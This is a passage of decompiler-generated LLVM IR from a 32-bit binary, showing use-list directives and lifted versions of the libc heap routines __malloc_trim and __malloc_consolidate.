  uselistorder i32 %v2_80535ac, { 1, 0 }
  uselistorder i32 %v1_80535a2, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_805359d.lcssa, { 1, 0 }
  uselistorder i32 %v3_805358d, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8053584, { 1, 0, 2 }
  uselistorder i32 %v2_8053560, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8053548, { 2, 1, 0 }
  uselistorder i32 %v0_8053534, { 2, 0, 3, 1 }
  uselistorder i32 %v3_80534fa, { 1, 0, 2 }
  uselistorder i32 %v0_80535c8111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_80534a7, { 1, 0, 2 }
  uselistorder i32 %v2_8053499, { 2, 1, 0 }
  uselistorder i32 %v2_8053474, { 2, 1, 0 }
  uselistorder i8 %v0_8053442, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_80537da, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_805342b, { 0, 2, 1 }
  uselistorder i32 %v0_8053414, { 1, 0 }
  uselistorder i32 %v2_80533fb, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 0, 11, 12, 14, 15, 16, 17, 1, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8065f40.974, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134634516, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_8065c20.962, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8065c0c.959 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8065c0c.959 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8053b50, { 1, 0 }
  uselistorder label %dec_label_pc_8053b3f, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053b32, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053b2e, { 1, 0 }
  uselistorder label %dec_label_pc_8053b24, { 1, 0 }
  uselistorder label %dec_label_pc_8053acf, { 1, 0 }
  uselistorder label %dec_label_pc_8053aa6, { 1, 0 }
  uselistorder label %dec_label_pc_8053a93, { 1, 0 }
  uselistorder label %dec_label_pc_8053a81, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053a13, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053a0e, { 1, 0 }
  uselistorder label %dec_label_pc_80539f2, { 1, 0 }
  uselistorder label %dec_label_pc_805399b, { 1, 0 }
  uselistorder label %dec_label_pc_8053984, { 1, 0 }
  uselistorder label %dec_label_pc_805396d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80538f0, { 1, 0 }
  uselistorder label %dec_label_pc_80538e3, { 1, 0 }
  uselistorder label %dec_label_pc_80538a4, { 1, 0 }
  uselistorder label %dec_label_pc_805387d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8053861, { 1, 0 }
  uselistorder label %dec_label_pc_8053848, { 1, 0 }
  uselistorder label %dec_label_pc_805382a, { 1, 0 }
  uselistorder label %dec_label_pc_8053745, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805373d, { 1, 0 }
  uselistorder label %dec_label_pc_8053726, { 1, 0 }
  uselistorder label %dec_label_pc_80536b9, { 1, 0 }
  uselistorder label %dec_label_pc_80536be.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8053692, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053619, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_80535a0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8053589, { 1, 0 }
  uselistorder label %dec_label_pc_80534f7, { 1, 0 }
  uselistorder label %dec_label_pc_80535c8.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80534c4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8053442, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8053b63 = load i32, i32* @edx, align 4
  store i32 %v0_8053b63, i32* %ebp.global-to-local, align 4
  %v1_8053b65 = add i32 %v0_8053b63, 860
  %v2_8053b65 = inttoptr i32 %v1_8053b65 to i32*
  %v3_8053b65 = load i32, i32* %v2_8053b65, align 4
  store i32 %v3_8053b65, i32* @ecx, align 4
  %v1_8053b6b = add i32 %v0_8053b63, 44
  %v2_8053b6b = inttoptr i32 %v1_8053b6b to i32*
  %v3_8053b6b = load i32, i32* %v2_8053b6b, align 4
  %v1_8053b6e = add i32 %v3_8053b6b, 4
  %v2_8053b6e = inttoptr i32 %v1_8053b6e to i32*
  %v3_8053b6e = load i32, i32* %v2_8053b6e, align 4
  %v1_8053b71 = and i32 %v3_8053b6e, -4
  store i32 %v1_8053b71, i32* @esi, align 4
  %v1_8053b76 = load i32, i32* @eax, align 4
  %v2_8053b76 = add i32 %v3_8053b65, -17
  %v2_8053b78 = add i32 %v2_8053b76, %v1_8053b71
  %v3_8053b78 = sub i32 %v2_8053b78, %v1_8053b76
  %div = udiv i32 %v3_8053b78, %v3_8053b65
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8053b78, %v3_8053b65
  store i32 %tmp10, i32* @edx, align 4
  %v1_8053b80 = add i32 %div, -1
  %v4_8053b83 = mul i32 %v1_8053b80, %v3_8053b65
  store i32 %v4_8053b83, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8053b83, 1
  br i1 %tmp11, label %dec_label_pc_8053bdf, label %dec_label_pc_8053b8a

dec_label_pc_8053b8a:                             ; preds = %entry
  %v1_8053b8f = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053b8f, i32* %edi.global-to-local, align 4
  %v0_8053b96 = load i32, i32* @esi, align 4
  store i32 %v0_8053b96, i32* %eax.global-to-local, align 4
  %v1_8053b98 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053b98 = add i32 %v1_8053b98, 44
  %v3_8053b98 = inttoptr i32 %v2_8053b98 to i32*
  %v4_8053b98 = load i32, i32* %v3_8053b98, align 4
  %v5_8053b98 = add i32 %v4_8053b98, %v0_8053b96
  store i32 %v5_8053b98, i32* %eax.global-to-local, align 4
  %v12_8053b9e = icmp eq i32 %v1_8053b8f, %v5_8053b98
  %v1_8053ba0 = icmp eq i1 %v12_8053b9e, false
  br i1 %v1_8053ba0, label %dec_label_pc_8053bdf, label %dec_label_pc_8053ba2

dec_label_pc_8053ba2:                             ; preds = %dec_label_pc_8053b8a
  %v1_8053ba5 = sub i32 0, %v4_8053b83
  store i32 %v1_8053ba5, i32* @ebx, align 4
  %v1_8053ba8 = call i32 @__GI_sbrk(i32 %v1_8053ba5)
  store i32 %v1_8053ba8, i32* %eax.global-to-local, align 4
  %v1_8053bb4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053bb4, i32* %eax.global-to-local, align 4
  %v10_8053bbc = icmp eq i32 %v1_8053bb4, -1
  br i1 %v10_8053bbc, label %dec_label_pc_8053bdf, label %dec_label_pc_8053bc1

dec_label_pc_8053bc1:                             ; preds = %dec_label_pc_8053ba2
  %v0_8053bc1 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053bc3 = sub i32 %v0_8053bc1, %v1_8053bb4
  %v12_8053bc3 = icmp eq i32 %v2_8053bc3, 0
  store i32 %v2_8053bc3, i32* @ecx, align 4
  br i1 %v12_8053bc3, label %dec_label_pc_8053bdf, label %dec_label_pc_8053bc7

dec_label_pc_8053bc7:                             ; preds = %dec_label_pc_8053bc1
  %v0_8053bc7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053bc7 = add i32 %v0_8053bc7, 44
  %v2_8053bc7 = inttoptr i32 %v1_8053bc7 to i32*
  %v3_8053bc7 = load i32, i32* %v2_8053bc7, align 4
  store i32 %v3_8053bc7, i32* %eax.global-to-local, align 4
  %v1_8053bca = add i32 %v0_8053bc7, 872
  %v2_8053bca = inttoptr i32 %v1_8053bca to i32*
  %v3_8053bca = load i32, i32* %v2_8053bca, align 4
  %v5_8053bca = sub i32 %v3_8053bca, %v2_8053bc3
  store i32 %v5_8053bca, i32* %v2_8053bca, align 4
  %v0_8053bd0 = load i32, i32* @esi, align 4
  %v1_8053bd0 = load i32, i32* @ecx, align 4
  %v2_8053bd0 = sub i32 %v0_8053bd0, %v1_8053bd0
  %v1_8053bd2 = or i32 %v2_8053bd0, 1
  %v1_8053bd5 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053bd5 = add i32 %v1_8053bd5, 4
  %v3_8053bd5 = inttoptr i32 %v2_8053bd5 to i32*
  store i32 %v1_8053bd2, i32* %v3_8053bd5, align 4
  br label %dec_label_pc_8053be1

dec_label_pc_8053bdf:                             ; preds = %dec_label_pc_8053bc1, %dec_label_pc_8053ba2, %dec_label_pc_8053b8a, %entry
  br label %dec_label_pc_8053be1

dec_label_pc_8053be1:                             ; preds = %dec_label_pc_8053bc7, %dec_label_pc_8053bdf
  %storemerge = phi i32 [ 1, %dec_label_pc_8053bc7 ], [ 0, %dec_label_pc_8053bdf ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053bb4, { 1, 0, 2 }
  uselistorder i32 %v4_8053b83, { 1, 2, 0 }
  uselistorder i32 %v3_8053b65, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053be1, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8053bea = load i32, i32* @edi, align 4
  %v0_8053beb = load i32, i32* @esi, align 4
  %v0_8053bec = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8053bf4 = load i32, i32* %arg1, align 4
  store i32 %v2_8053bf4, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8053bfb = icmp eq i32 %v2_8053bf4, 0
  br i1 %v1_8053bfb, label %dec_label_pc_8053d24.preheader, label %dec_label_pc_8053c03

dec_label_pc_8053d24.preheader:                   ; preds = %entry
  %v3_8053d19 = add i32 %tmp11, 44
  br label %dec_label_pc_8053d15

dec_label_pc_8053c03:                             ; preds = %entry
  %v1_8053c07 = and i32 %v2_8053bf4, -3
  store i32 %v1_8053c07, i32* %arg1, align 4
  %v1_8053c0c = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_8053c17 = add i32 %tmp11, 4
  store i32 %v1_8053c17, i32* %eax.global-to-local, align 4
  %v2_8053c22 = load i32, i32* %arg1, align 4
  %v2_8053c28 = udiv i32 %v2_8053c22, 8
  %v2_8053c2b = mul nuw i32 %v2_8053c28, 4
  %v3_8053c2b = add i32 %tmp11, -4
  %v4_8053c2b = add i32 %v3_8053c2b, %v2_8053c2b
  store i32 %v4_8053c2b, i32* %eax.global-to-local, align 4
  %v2_8053cf2 = add i32 %tmp11, 44
  %v3_8053cf2 = inttoptr i32 %v2_8053cf2 to i32*
  %v1_8053cc5 = add i32 %tmp11, 60
  %v2_8053cc5 = inttoptr i32 %v1_8053cc5 to i32*
  br label %dec_label_pc_8053c33

dec_label_pc_8053c33:                             ; preds = %dec_label_pc_8053d0b, %dec_label_pc_8053c03
  %v0_8053c41 = phi i32 [ %v1_8053c17, %dec_label_pc_8053c03 ], [ %v4_8053d0b, %dec_label_pc_8053d0b ]
  store i32 %v0_8053c41, i32* %eax.global-to-local, align 4
  %v1_8053c37 = inttoptr i32 %v0_8053c41 to i32*
  %v2_8053c37 = load i32, i32* %v1_8053c37, align 4
  store i32 %v2_8053c37, i32* @ecx, align 4
  %v1_8053c39 = icmp eq i32 %v2_8053c37, 0
  br i1 %v1_8053c39, label %dec_label_pc_8053d01, label %dec_label_pc_8053c41

dec_label_pc_8053c41:                             ; preds = %dec_label_pc_8053c33
  store i32 0, i32* %v1_8053c37, align 4
  %v0_8053c47.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053c47

dec_label_pc_8053c47:                             ; preds = %dec_label_pc_8053cf5, %dec_label_pc_8053c41
  %v0_8053c64 = phi i32 [ %v3_8053c47, %dec_label_pc_8053cf5 ], [ %v0_8053c47.pre, %dec_label_pc_8053c41 ]
  %v1_8053c47 = add i32 %v0_8053c64, 8
  %v2_8053c47 = inttoptr i32 %v1_8053c47 to i32*
  %v3_8053c47 = load i32, i32* %v2_8053c47, align 4
  store i32 %v3_8053c47, i32* %edx.global-to-local, align 4
  %v1_8053c4e = add i32 %v0_8053c64, 4
  %v2_8053c4e = inttoptr i32 %v1_8053c4e to i32*
  %v3_8053c4e = load i32, i32* %v2_8053c4e, align 4
  store i32 %v3_8053c4e, i32* %eax.global-to-local, align 4
  %v1_8053c53 = and i32 %v3_8053c4e, -2
  store i32 %v1_8053c53, i32* @edi, align 4
  %v2_8053c56 = urem i32 %v3_8053c4e, 2
  %v3_8053c56 = icmp eq i32 %v2_8053c56, 0
  %v2_8053c58 = add i32 %v1_8053c53, %v0_8053c64
  store i32 %v2_8053c58, i32* @ebx, align 4
  %v1_8053c5b = add i32 %v2_8053c58, 4
  %v2_8053c5b = inttoptr i32 %v1_8053c5b to i32*
  %v3_8053c5b = load i32, i32* %v2_8053c5b, align 4
  store i32 %v3_8053c5b, i32* %edx.global-to-local, align 4
  %v1_8053c62 = icmp eq i1 %v3_8053c56, false
  br i1 %v1_8053c62, label %dec_label_pc_8053c84, label %dec_label_pc_8053c64

dec_label_pc_8053c64:                             ; preds = %dec_label_pc_8053c47
  %v1_8053c64 = inttoptr i32 %v0_8053c64 to i32*
  %v2_8053c64 = load i32, i32* %v1_8053c64, align 4
  store i32 %v2_8053c64, i32* %ebp.global-to-local, align 4
  %v2_8053c68 = sub i32 %v0_8053c64, %v2_8053c64
  store i32 %v2_8053c68, i32* %eax.global-to-local, align 4
  %v1_8053c6a = add i32 %v2_8053c68, 8
  %v2_8053c6a = inttoptr i32 %v1_8053c6a to i32*
  %v3_8053c6a = load i32, i32* %v2_8053c6a, align 4
  store i32 %v3_8053c6a, i32* @esi, align 4
  %v1_8053c6d = add i32 %v2_8053c68, 12
  %v2_8053c6d = inttoptr i32 %v1_8053c6d to i32*
  %v3_8053c6d = load i32, i32* %v2_8053c6d, align 4
  store i32 %v3_8053c6d, i32* %edx.global-to-local, align 4
  %v1_8053c70 = add i32 %v3_8053c6a, 12
  %v2_8053c70 = inttoptr i32 %v1_8053c70 to i32*
  %v3_8053c70 = load i32, i32* %v2_8053c70, align 4
  store i32 %v3_8053c70, i32* @ecx, align 4
  %v12_8053c73 = icmp eq i32 %v3_8053c70, %v2_8053c68
  %v1_8053c75 = icmp eq i1 %v12_8053c73, false
  br i1 %v1_8053c75, label %dec_label_pc_8053cb4, label %dec_label_pc_8053c77

dec_label_pc_8053c77:                             ; preds = %dec_label_pc_8053c64
  %v1_8053c77 = add i32 %v3_8053c6d, 8
  %v2_8053c77 = inttoptr i32 %v1_8053c77 to i32*
  %v3_8053c77 = load i32, i32* %v2_8053c77, align 4
  %v15_8053c77 = icmp eq i32 %v3_8053c77, %v3_8053c70
  %v1_8053c7a = icmp eq i1 %v15_8053c77, false
  br i1 %v1_8053c7a, label %dec_label_pc_8053cb4, label %dec_label_pc_8053c7c

dec_label_pc_8053c7c:                             ; preds = %dec_label_pc_8053c77
  %v2_8053c7c = add i32 %v2_8053c64, %v1_8053c53
  store i32 %v2_8053c7c, i32* @edi, align 4
  store i32 %v3_8053c6d, i32* %v2_8053c70, align 4
  %v0_8053c81 = load i32, i32* @esi, align 4
  %v1_8053c81 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053c81 = add i32 %v1_8053c81, 8
  %v3_8053c81 = inttoptr i32 %v2_8053c81 to i32*
  store i32 %v0_8053c81, i32* %v3_8053c81, align 4
  %v0_8053c8f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053c84

dec_label_pc_8053c84:                             ; preds = %dec_label_pc_8053c47, %dec_label_pc_8053c7c
  %v1_8053c98 = phi i32 [ %v2_8053c58, %dec_label_pc_8053c47 ], [ %v0_8053c8f.pre, %dec_label_pc_8053c7c ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053c8c = and i32 %v3_8053c5b, -4
  store i32 %v1_8053c8c, i32* %ebp.global-to-local, align 4
  %v4_8053c8f = load i32, i32* %v3_8053cf2, align 4
  %v15_8053c8f = icmp eq i32 %v1_8053c98, %v4_8053c8f
  br i1 %v15_8053c8f, label %dec_label_pc_8053ce5, label %dec_label_pc_8053c94

dec_label_pc_8053c94:                             ; preds = %dec_label_pc_8053c84
  %v2_8053c94 = add i32 %v1_8053c98, 4
  %v3_8053c94 = add i32 %v2_8053c94, %v1_8053c8c
  %v4_8053c94 = inttoptr i32 %v3_8053c94 to i32*
  %v5_8053c94 = load i32, i32* %v4_8053c94, align 4
  store i32 %v5_8053c94, i32* %eax.global-to-local, align 4
  %v3_8053c98 = inttoptr i32 %v2_8053c94 to i32*
  store i32 %v1_8053c8c, i32* %v3_8053c98, align 4
  %v0_8053c9b = load i32, i32* %eax.global-to-local, align 4
  %v1_8053c9b = urem i32 %v0_8053c9b, 2
  %v2_8053c9b = icmp eq i32 %v1_8053c9b, 0
  store i32 %v1_8053c9b, i32* %eax.global-to-local, align 4
  %v1_8053ca0 = icmp eq i1 %v2_8053c9b, false
  br i1 %v1_8053ca0, label %dec_label_pc_8053cc1, label %dec_label_pc_8053ca2

dec_label_pc_8053ca2:                             ; preds = %dec_label_pc_8053c94
  %v0_8053ca2 = load i32, i32* @ebx, align 4
  %v1_8053ca2 = add i32 %v0_8053ca2, 8
  %v2_8053ca2 = inttoptr i32 %v1_8053ca2 to i32*
  %v3_8053ca2 = load i32, i32* %v2_8053ca2, align 4
  store i32 %v3_8053ca2, i32* @edx, align 4
  %v1_8053ca5 = add i32 %v0_8053ca2, 12
  %v2_8053ca5 = inttoptr i32 %v1_8053ca5 to i32*
  %v3_8053ca5 = load i32, i32* %v2_8053ca5, align 4
  store i32 %v3_8053ca5, i32* %eax.global-to-local, align 4
  %v1_8053ca8 = add i32 %v3_8053ca2, 12
  %v2_8053ca8 = inttoptr i32 %v1_8053ca8 to i32*
  %v3_8053ca8 = load i32, i32* %v2_8053ca8, align 4
  store i32 %v3_8053ca8, i32* @esi, align 4
  %v12_8053cab = icmp eq i32 %v3_8053ca8, %v0_8053ca2
  %v1_8053cad = icmp eq i1 %v12_8053cab, false
  br i1 %v1_8053cad, label %dec_label_pc_8053cb4, label %dec_label_pc_8053caf

dec_label_pc_8053caf:                             ; preds = %dec_label_pc_8053ca2
  %v1_8053caf = add i32 %v3_8053ca5, 8
  %v2_8053caf = inttoptr i32 %v1_8053caf to i32*
  %v3_8053caf = load i32, i32* %v2_8053caf, align 4
  %v15_8053caf = icmp eq i32 %v3_8053caf, %v3_8053ca8
  br i1 %v15_8053caf, label %dec_label_pc_8053cb9, label %dec_label_pc_8053cb4

dec_label_pc_8053cb4:                             ; preds = %dec_label_pc_8053caf, %dec_label_pc_8053ca2, %dec_label_pc_8053c77, %dec_label_pc_8053c64
  %v0_8053cb4 = call i32 @abort()
  store i32 %v0_8053cb4, i32* %eax.global-to-local, align 4
  %v1_8053cbb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053cb9

dec_label_pc_8053cb9:                             ; preds = %dec_label_pc_8053caf, %dec_label_pc_8053cb4
  %v1_8053cbb = phi i32 [ %v3_8053ca2, %dec_label_pc_8053caf ], [ %v1_8053cbb.pre, %dec_label_pc_8053cb4 ]
  %v0_8053cbb = phi i32 [ %v3_8053ca5, %dec_label_pc_8053caf ], [ %v0_8053cb4, %dec_label_pc_8053cb4 ]
  %v0_8053cb9 = load i32, i32* @edi, align 4
  %v1_8053cb9 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053cb9 = add i32 %v1_8053cb9, %v0_8053cb9
  store i32 %v2_8053cb9, i32* @edi, align 4
  %v2_8053cbb = add i32 %v1_8053cbb, 12
  %v3_8053cbb = inttoptr i32 %v2_8053cbb to i32*
  store i32 %v0_8053cbb, i32* %v3_8053cbb, align 4
  %v0_8053cbe = load i32, i32* @edx, align 4
  %v1_8053cbe = load i32, i32* %eax.global-to-local, align 4
  %v2_8053cbe = add i32 %v1_8053cbe, 8
  %v3_8053cbe = inttoptr i32 %v2_8053cbe to i32*
  store i32 %v0_8053cbe, i32* %v3_8053cbe, align 4
  br label %dec_label_pc_8053cc1

dec_label_pc_8053cc1:                             ; preds = %dec_label_pc_8053c94, %dec_label_pc_8053cb9
  store i32 %v1_8053c0c, i32* %eax.global-to-local, align 4
  %v3_8053cc5 = load i32, i32* %v2_8053cc5, align 4
  store i32 %v3_8053cc5, i32* @edx, align 4
  %v0_8053cc8 = load i32, i32* @ecx, align 4
  store i32 %v0_8053cc8, i32* %v2_8053cc5, align 4
  %v0_8053ccb = load i32, i32* @edi, align 4
  %v1_8053ccd = or i32 %v0_8053ccb, 1
  store i32 %v1_8053ccd, i32* %eax.global-to-local, align 4
  %v0_8053cd0 = load i32, i32* @ecx, align 4
  %v1_8053cd0 = load i32, i32* @edx, align 4
  %v2_8053cd0 = add i32 %v1_8053cd0, 12
  %v3_8053cd0 = inttoptr i32 %v2_8053cd0 to i32*
  store i32 %v0_8053cd0, i32* %v3_8053cd0, align 4
  %v0_8053cd3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053cd3 = load i32, i32* @ecx, align 4
  %v2_8053cd3 = add i32 %v1_8053cd3, 4
  %v3_8053cd3 = inttoptr i32 %v2_8053cd3 to i32*
  store i32 %v0_8053cd3, i32* %v3_8053cd3, align 4
  store i32 %v1_8053c0c, i32* %eax.global-to-local, align 4
  %v0_8053cda = load i32, i32* @edx, align 4
  %v1_8053cda = load i32, i32* @ecx, align 4
  %v2_8053cda = add i32 %v1_8053cda, 8
  %v3_8053cda = inttoptr i32 %v2_8053cda to i32*
  store i32 %v0_8053cda, i32* %v3_8053cda, align 4
  %v0_8053cdd = load i32, i32* %eax.global-to-local, align 4
  %v1_8053cdd = load i32, i32* @ecx, align 4
  %v2_8053cdd = add i32 %v1_8053cdd, 12
  %v3_8053cdd = inttoptr i32 %v2_8053cdd to i32*
  store i32 %v0_8053cdd, i32* %v3_8053cdd, align 4
  %v0_8053ce0 = load i32, i32* @edi, align 4
  %v1_8053ce0 = load i32, i32* @ecx, align 4
  %v3_8053ce0 = add i32 %v1_8053ce0, %v0_8053ce0
  %v4_8053ce0 = inttoptr i32 %v3_8053ce0 to i32*
  store i32 %v0_8053ce0, i32* %v4_8053ce0, align 4
  br label %dec_label_pc_8053cf5

dec_label_pc_8053ce5:                             ; preds = %dec_label_pc_8053c84
  %v0_8053ce5 = load i32, i32* @edi, align 4
  %v2_8053ce5 = add i32 %v0_8053ce5, %v1_8053c8c
  %v1_8053ce8 = or i32 %v2_8053ce5, 1
  store i32 %v1_8053ce8, i32* %eax.global-to-local, align 4
  %v1_8053ceb = load i32, i32* @ecx, align 4
  %v2_8053ceb = add i32 %v1_8053ceb, 4
  %v3_8053ceb = inttoptr i32 %v2_8053ceb to i32*
  store i32 %v1_8053ce8, i32* %v3_8053ceb, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8053cf2 = load i32, i32* @ecx, align 4
  store i32 %v0_8053cf2, i32* %v3_8053cf2, align 4
  br label %dec_label_pc_8053cf5

dec_label_pc_8053cf5:                             ; preds = %dec_label_pc_8053cc1, %dec_label_pc_8053ce5
  store i32 %v3_8053c47, i32* @ecx, align 4
  %v1_8053cf9 = icmp eq i32 %v3_8053c47, 0
  %v1_8053cfb = icmp eq i1 %v1_8053cf9, false
  br i1 %v1_8053cfb, label %dec_label_pc_8053c47, label %dec_label_pc_8053d01

dec_label_pc_8053d01:                             ; preds = %dec_label_pc_8053cf5, %dec_label_pc_8053c33
  store i32 %v4_8053c2b, i32* @ecx, align 4
  %v15_8053d05 = icmp eq i32 %v0_8053c41, %v4_8053c2b
  br i1 %v15_8053d05, label %dec_label_pc_8053d89, label %dec_label_pc_8053d0b

dec_label_pc_8053d0b:                             ; preds = %dec_label_pc_8053d01
  %v4_8053d0b = add i32 %v0_8053c41, 4
  br label %dec_label_pc_8053c33

dec_label_pc_8053d15:                             ; preds = %dec_label_pc_8053d24.preheader, %dec_label_pc_8053d15
  %v1_8053d1920 = phi i32 [ 1, %dec_label_pc_8053d24.preheader ], [ %v0_8053d24.pre, %dec_label_pc_8053d15 ]
  %v2_8053d19 = mul i32 %v1_8053d1920, 8
  %v4_8053d19 = add i32 %v3_8053d19, %v2_8053d19
  store i32 %v4_8053d19, i32* %eax.global-to-local, align 4
  %v1_8053d1d = add i32 %v1_8053d1920, 1
  store i32 %v1_8053d1d, i32* %edx.global-to-local, align 4
  %v2_8053d1e = add i32 %v4_8053d19, 12
  %v3_8053d1e = inttoptr i32 %v2_8053d1e to i32*
  store i32 %v4_8053d19, i32* %v3_8053d1e, align 4
  %v0_8053d21 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053d21 = add i32 %v0_8053d21, 8
  %v3_8053d21 = inttoptr i32 %v2_8053d21 to i32*
  store i32 %v0_8053d21, i32* %v3_8053d21, align 4
  %v0_8053d24.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8053d27 = icmp sgt i32 %v0_8053d24.pre, 95
  br i1 %v7_8053d27, label %dec_label_pc_8053d29, label %dec_label_pc_8053d15

dec_label_pc_8053d29:                             ; preds = %dec_label_pc_8053d15
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053d2d = add i32 %tmp11, 864
  %v2_8053d2d = inttoptr i32 %v1_8053d2d to i32*
  %v3_8053d2d = load i32, i32* %v2_8053d2d, align 4
  %v4_8053d2d = or i32 %v3_8053d2d, 1
  store i32 %v4_8053d2d, i32* %v2_8053d2d, align 4
  %v0_8053d34 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d34 = add i32 %v0_8053d34, 840
  %v2_8053d34 = inttoptr i32 %v1_8053d34 to i32*
  store i32 0, i32* %v2_8053d34, align 4
  %v0_8053d3e = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d3e = add i32 %v0_8053d3e, 852
  %v2_8053d3e = inttoptr i32 %v1_8053d3e to i32*
  store i32 65536, i32* %v2_8053d3e, align 4
  %v0_8053d48 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d48 = add i32 %v0_8053d48, 844
  %v2_8053d48 = inttoptr i32 %v1_8053d48 to i32*
  store i32 262144, i32* %v2_8053d48, align 4
  %v0_8053d52 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d52 = add i32 %v0_8053d52, 836
  %v2_8053d52 = inttoptr i32 %v1_8053d52 to i32*
  store i32 262144, i32* %v2_8053d52, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_8053d63 = load i32, i32* %arg1, align 4
  %v1_8053d65 = urem i32 %v2_8053d63, 4
  %v1_8053d68 = or i32 %v1_8053d65, 72
  store i32 %v1_8053d68, i32* %arg1, align 4
  %v0_8053d6d = load i32, i32* @edx, align 4
  %v1_8053d6f = add i32 %v0_8053d6d, 52
  store i32 %v1_8053d6f, i32* %eax.global-to-local, align 4
  %v2_8053d72 = add i32 %v0_8053d6d, 44
  %v3_8053d72 = inttoptr i32 %v2_8053d72 to i32*
  store i32 %v1_8053d6f, i32* %v3_8053d72, align 4
  %v1_8053d77 = call i32 @sysconf(i32 30)
  store i32 %v1_8053d77, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8053d83 = add i32 %tmp11, 860
  %v3_8053d83 = inttoptr i32 %v2_8053d83 to i32*
  store i32 %v1_8053d77, i32* %v3_8053d83, align 4
  br label %dec_label_pc_8053d89

dec_label_pc_8053d89:                             ; preds = %dec_label_pc_8053d01, %dec_label_pc_8053d29
  store i32 %v0_8053bec, i32* @ebx, align 4
  store i32 %v0_8053beb, i32* @esi, align 4
  store i32 %v0_8053bea, i32* @edi, align 4
  %v0_8053d90 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053d90

